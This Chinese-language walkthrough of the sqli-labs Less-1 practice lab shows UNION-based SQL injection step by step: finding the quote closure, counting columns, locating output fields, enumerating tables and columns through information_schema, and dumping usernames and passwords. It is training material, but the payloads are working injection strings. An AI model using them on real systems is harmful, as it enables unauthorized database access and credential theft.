## ​1.判断是否存在注入点

### 1.1输入 http://192.168.43.104/sqli-labs/Less-1/

?id=1

输出正常

![1615021150_6043445e7c4c5337ddb2c.png!small](https://image.3001.net/images/20210306/1615021150_6043445e7c4c5337ddb2c.png!small)

### 1.2 输入 http://192.168.43.104/sqli-labs/Less-1/?id=1'

输入单引号的目的是判断提交的内容是否被过滤掉，有没有被提交到数据库中执行。从而判断该处是否存在注入点。

输出报错信息：

![1615021195_6043448b3bafea1858167.png!small](https://image.3001.net/images/20210306/1615021195_6043448b3bafea1858167.png!small)

You have an error in your SQL syntax; check the manual that corresponds to
your MariaDB server version for the right syntax to use near **''1'' LIMIT
0,1'** at line 1

 **''1'' LIMIT 0,1'**

 **去掉 ''1'' LIMIT 0,1'最外面的单引号得**

 **'1'' LIMIT 0,1**

 **1'是我们输入的数据，那么最外面的单引号是哪里来的呢？**

 **极大可能是数据库的闭合符号为'**

再利用\符号探测一下

\可以将数据库语句中的相关符号进行转义，使其失去一些特定的意义。

输入：http://192.168.43.104/sqli-labs/Less-1/?id=\

输出报错信息：

You have an error in your SQL syntax; check the manual that corresponds to
your MariaDB server version for the right syntax to use near ''\' LIMIT 0,1'
at line 1

 **''\' LIMIT 0,1'**

 **去掉 ''\' LIMIT 0,1'最外面的单引号得**

 **'\' LIMIT 0,1**

 **\是我们输入的数据，那么其外面的单引号是怎么来的呢？**

 **极大可能是数据库的闭合符为'**

![1615021226_604344aa9e4d06e30ab9c.png!small](https://image.3001.net/images/20210306/1615021226_604344aa9e4d06e30ab9c.png!small)

综上可以推出数据库中包含的语句有一部分为id = 'input'

那么我们就可以构造相对应的攻击代码id = 'input 攻击代码'

在构造攻击代码的过程中我们需要将单引号闭合然后将后面的单引号注释掉，保证sql指令的正确执行。这种方法叫做------ **闭合法和注释法**

闭合法就是将闭合符闭合掉

注释法就是将多余的符号注释掉，这里指的是把多余的'注释掉。

在mysql中--表示注释，但是注释符和被注释的符号或者语句之间必须得有空格，所以得加上空格（在mysql指令中+号表示空格），所以注释符号组合为--+

当然也可以单纯使用闭合法将sql指令完美闭合掉。

## 2.判断数据库表中的字段数量 （利用order by函数）

输入：http://192.168.43.104/sqli-labs/Less-1/

?id=1' order by 10 --+

输出报错信息：Unknown column '10' in 'order clause'

表名该表不存在10个字段，接下来我们使用折半继续猜。

![1615021268_604344d422f864c9f4bd5.png!small](https://image.3001.net/images/20210306/1615021268_604344d422f864c9f4bd5.png!small)

接下来我们使用折半算法继续判断。

输入：http://192.168.43.104/sqli-labs/Less-1/

?id=1' order by 5 --+

输出错误信息：Unknown column '5' in 'order clause'

![1615021289_604344e9811059619b4a5.png!small](https://image.3001.net/images/20210306/1615021289_604344e9811059619b4a5.png!small)

接下来我们使用折半算法继续判断。

输入：http://192.168.43.104/sqli-labs/Less-1/

?id=1' order by 3 --+

输出正常

表明该表存在三个字段，但是只显示了两个字段，接下来我们需要判断各个字段的位置。

![1615021316_60434504869477d3d8724.png!small](https://image.3001.net/images/20210306/1615021316_60434504869477d3d8724.png!small)

## 3.使用union联合查询爆出字段的位置。

原理：union联合查询可以把一条或者多条语句的查询结果合并并且显示，但是语句的字段数必须一致。

### 3.1 输入：http://192.168.43.104/sqli-labs/Less-1/

?id=1' union select 1,2,3 --+

输出：

![1615021353_60434529cd87776870aa1.png!small](https://image.3001.net/images/20210306/1615021353_60434529cd87776870aa1.png!small)

因为id=1可以使数据正常输出，所以我们需要使得id等于一个为假的数值。

一般情况下数据库设计过程中id不可能为一个负数，所以在这里我们可以使得id等于-1

输入：http://192.168.43.104/sqli-labs/Less-1/

?id=-1' union select 1,2,3 --+

输出：

![1615021376_60434540c27034e3b388e.png!small](https://image.3001.net/images/20210306/1615021376_60434540c27034e3b388e.png!small)

所以可以得到：name在第二个位置

password在第三个位置

id在第一个位置

## 4.利用database()函数获取数据库名

原理：database()函数是mysql数据库的内嵌函数，主要用于查询数据库名称。

user()函数可以查看当前数据库的登录的用户

version()函数可以查看当前数据库的版本

@@version_compile_os可以查看当前系统的类型

@@datadir查看当前数据库的路径

输入：http://192.168.43.104/sqli-labs/Less-1/

?id=-1' union select 1,database(),user() --+

输出：

![1615021401_60434559a4e0efae7d50d.png!small](https://image.3001.net/images/20210306/1615021401_60434559a4e0efae7d50d.png!small)

输入：http://192.168.43.104/sqli-labs/Less-1/

?id=-1' union select 1,version(),@@version_compile_os --+

输出：

![1615021419_6043456b0d5de9f1e7e54.png!small](https://image.3001.net/images/20210306/1615021419_6043456b0d5de9f1e7e54.png!small)

输入：http://192.168.43.104/sqli-labs/Less-1/

?id=-1' union select 1,@@datadir,@@version_compile_os --+

输出：

![1615021436_6043457cc15203c180433.png!small](https://image.3001.net/images/20210306/1615021436_6043457cc15203c180433.png!small)

## 5.获取数据库表名

原理：在mysql数据库中有一个系统自带的数据库专门来存放数据库的元数据的，即存放了mysql当中有哪些库，库中有哪些表，表中哪些字段。

该数据库为：information_schema库

该数据库下的tables表存放表数据，tables中字段table_shema 存放数据库名，table_name存放数据库中对应的表名

该数据库下的columns表存放字段数据，该表中的column_name字段存放字段名

输入：http://192.168.43.104/sqli-labs/Less-1/

?id=-1' union select 1,table_name,3 from information_schema.tables where
table_schema='security' --+

输出：

![1615021456_604345904088416943c51.png!small](https://image.3001.net/images/20210306/1615021456_604345904088416943c51.png!small)

由上图可知显示的表名只有一个，显示不完全。那么如何将数据库中所有表名拆解出来呢？

这里介绍一个数据库的函数：group_comcat()函数

 **group_comcat()函数的功能：将where条件匹配到的多条记录接连成一个字符串。**

输入 **：** http://192.168.43.104/sqli-labs/Less-1/

?id=-1' union select 1,group_concat(table_name),3 from
information_schema.tables where table_schema='security' --+

输出：可见所有的表名就显示出来了。

![1615021472_604345a0c8188cd2213bf.png!small](https://image.3001.net/images/20210306/1615021472_604345a0c8188cd2213bf.png!small)

## 6.获取表中的字段

原理：information_schema数据库下的columns表存放字段数据，该表中的column_name字段存放字段名。

输入：查询users表的字段

http://192.168.43.104/sqli-labs/Less-1/

?id=-1' union select 1,group_concat(column_name),3

from information_schema.columns

where table_schema='security' and table_name='users' --+

输出：users表的字段为，id，username，password

![1615021521_604345d1d969bd94583e6.png!small](https://image.3001.net/images/20210306/1615021521_604345d1d969bd94583e6.png!small)

其他的数据库可以对比进行查看字段值。

例如查看emails数据库的各个字段值。

输入：http://192.168.43.104/sqli-labs/Less-1/

?id=-1' union select 1,group_concat(column_name),3

from information_schema.columns

where table_schema='security' and table_name='emails' --+

输出：

![1615021580_6043460cd45883c10880f.png!small](https://image.3001.net/images/20210306/1615021580_6043460cd45883c10880f.png!small)

## 7.拿数据

### 7.1使用冒号分隔拿到的数据实现美观

http://192.168.43.104/sqli-labs/Less-1/

?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+

![1615021603_60434623a98545ee51e35.png!small](https://image.3001.net/images/20210306/1615021603_60434623a98545ee51e35.png!small)

0x3a===>冒号的十六进制表示

### 7.2 使用换行符显示分隔拿到的数据实现美观

http://192.168.43.104/sqli-labs/Less-1/

?id=-1' union select
1,group_concat(username,0x3a,password,0x3C,0x68,0x72,0x2F,0x3E),3 from users
--+

![1615021626_6043463a28891c03fa7ff.png!small](https://image.3001.net/images/20210306/1615021626_6043463a28891c03fa7ff.png!small)

![1615021637_60434645d2fd5576adaaf.png!small](https://image.3001.net/images/20210306/1615021637_60434645d2fd5576adaaf.png!small)

<hr/>

0x3C===》>的十六进制表示

0x68===》h的十六进制表示

0x72===》r的十六进制表示

0x2F===》/的十六进制表示

0x3E===》>的十六进制表示

![](https://image.3001.net/images/20210306/1615021651_60434653e8f18e2b7692d.jpg!small)

